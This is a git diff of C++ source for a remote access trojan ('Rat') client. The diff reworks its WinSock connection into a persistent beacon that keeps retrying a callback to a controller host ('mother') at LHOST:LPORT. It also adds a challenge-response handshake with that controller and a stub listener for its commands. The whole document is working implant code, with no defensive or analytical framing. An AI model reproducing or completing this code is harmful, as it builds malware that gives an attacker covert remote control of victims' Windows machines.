@@ -1,7 +1,5 @@
 #include <rat.hpp>
 
-const int behaviour = 0;
-
 Rat::Rat(): lhost(LHOST), lport(LPORT) {
     // Before using WinSock you must initialize the API
     // before using any socket related functonality
@@ -11,65 +9,84 @@ Rat::Rat(): lhost(LHOST), lport(LPORT) {
         return;
     }
 
-    mother = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (mother == INVALID_SOCKET) {
-        std::cerr << "Socket creation failed.\n";
-        WSACleanup(); // cleans up the API
-        return;
-    }
-
-    sockaddr_in serv_addr;
-    serv_addr.sin_family = AF_INET;
-    serv_addr.sin_port = htons(lport);
-    inet_pton(AF_INET, lhost.c_str(), &serv_addr.sin_addr);
-
-    std::cout << "[*] Attempting to Connect to | " << lhost << ":" << lport << std::endl;
-
-    if (connect(mother, (sockaddr*)&serv_addr, sizeof(serv_addr)) == SOCKET_ERROR) {
-        std::cerr << "Connection failed.\n";
-        closesocket(mother);
-        WSACleanup();
-        return;
-    }
-
-    bool estab = Initiate();
-    
-    if (estab) {
-        std::cout << "[+] Established with MOTHER!" << std::endl;
-        // listen for mother
-    } else {
-        std::cerr << "[-] Cannot Establish Properly. . ." << std::endl;
+    while (true) {
+        Ping();
+        Listen();
     }
 
     closesocket(mother);
-    WSACleanup();
+    WSACleanup(); // cleans up the API
+}
+
+RatState Rat::GetState() const {
+    return ratState;
+}
+
+// when connection isnt established ping the endpoint
+void Rat::Ping() {
+    while (ratState != RatState::ESTAB) {
+        std::cout << "[*] Attempting to create Socket. . ." << std::endl;
+        mother = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (mother == INVALID_SOCKET) {
+            std::cerr << "[-] Socket creation failed.\n";
+
+            ratState = RatState::PINGING;
+            std::this_thread::sleep_for(std::chrono::seconds(3));
+
+            continue;
+        }
+
+        sockaddr_in serv_addr;
+        serv_addr.sin_family = AF_INET;
+        serv_addr.sin_port = htons(lport);
+        inet_pton(AF_INET, lhost.c_str(), &serv_addr.sin_addr);
+
+        std::cout << "[*] Attempting to Connect to | " << lhost << ":" << lport << std::endl;
+
+        if (connect(mother, (sockaddr*)&serv_addr, sizeof(serv_addr)) == SOCKET_ERROR) {
+            std::cerr << "[-] Connection failed.\n";
+
+            ratState = RatState::PINGING;
+            closesocket(mother);
+            std::this_thread::sleep_for(std::chrono::seconds(3));
+
+            continue;
+        }
+
+        // attempt to establish stable connection
+        if (EstablishConnection()) {
+            ratState = RatState::ESTAB;
+        }
+    }
+    std::cout << "[+] Connected!" << std::endl;
 }
 
 // send an initialize packet to inform we are active
-bool Rat::Initiate() {
-    std::cout << "[*] Sending Initializing Frame. . ." << std::endl;
-    RatPacket initPacket("imgettingratty", MsgType::INIT);
-    send(mother, initPacket.Frame().c_str(), initPacket.SizeOf(), behaviour);
+bool Rat::EstablishConnection() {
+    std::cout << "[*] Attempting to Establish Connection. . ." << std::endl;
+
+    RatPacketUtils::Send(mother, RatPacket("imgettingratty", MsgType::INIT));
 
     char buffer[1024] = {0};
-    int bytesReceived = recv(mother, buffer, sizeof(buffer), behaviour);
+    int bytesReceived = recv(mother, buffer, sizeof(buffer), 0);
     if (bytesReceived > 0) {
         std::cout << "[*] Recv Challenge. . ." << std::endl;
 
         // recv challenge
-        RatPacket challPacket(std::string(buffer, bytesReceived).c_str());
+        std::string challData = std::string(buffer, bytesReceived);
+        RatPacket challPacket(challData.c_str());
         std::string code = challPacket.GetPacketMessage();
 
         std::cout << "[*] Replying to Challenge. . ." << std::endl;
         // reply to it
-        RatPacket initPacket(code, MsgType::INIT);
-        send(mother, initPacket.Frame().c_str(), initPacket.SizeOf(), behaviour);
+        RatPacketUtils::Send(mother, RatPacket(code, MsgType::INIT));
 
         // final ack of before possible estab
-        bytesReceived = recv(mother, buffer, sizeof(buffer), behaviour);
+        bytesReceived = recv(mother, buffer, sizeof(buffer), 0);
         if (bytesReceived > 0) {
             std::cout << "[*] Recv Estab Ack. . ." << std::endl;
-            RatPacket ackPacket(std::string(buffer, bytesReceived).c_str());
+            std::string ackData = std::string(buffer, bytesReceived);
+            RatPacket ackPacket(ackData.c_str());
             return ackPacket.GetPacketMessage() == "ratty";
         }
         return false;
@@ -78,7 +95,8 @@ bool Rat::Initiate() {
         return false;
     }
 }
-// send non-init packets back to mother
-void Rat::TellMother() {
 
+// send non-init packets back to mother
+void Rat::Listen() {
+    std::cout << "[+] Established with MOTHER!" << std::endl;
 }
